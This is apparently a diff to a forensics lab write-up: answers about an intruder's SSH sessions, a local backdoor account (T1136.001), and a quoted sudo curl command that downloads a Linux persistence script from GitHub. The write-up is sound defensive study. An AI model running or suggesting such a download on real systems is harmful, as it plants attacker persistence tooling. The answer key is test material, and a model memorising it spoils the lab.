@@ -51,10 +51,20 @@ A: T1136.001
 
 In the matrix (), we search first the persistence column, then for acc creation, and for the sub technique we select the appropiate (this been an acc created on the system itself it's a local acc)
 
+![](../../Img/Pasted%20image%2020250425145401.png)
+
 Q7: What time did the attacker's first SSH session end according to auth.log?
 
 A: 2024-03-06 06:37:24
 
+In the file just look for disconnect for session 37
+
+![](../../Img/Pasted%20image%2020250425145457.png)
+
 Q8: The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?
 
 A: /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
+
+Just below the last question we see the answer.
+
+![](../../Img/Pasted%20image%2020250425145615.png)
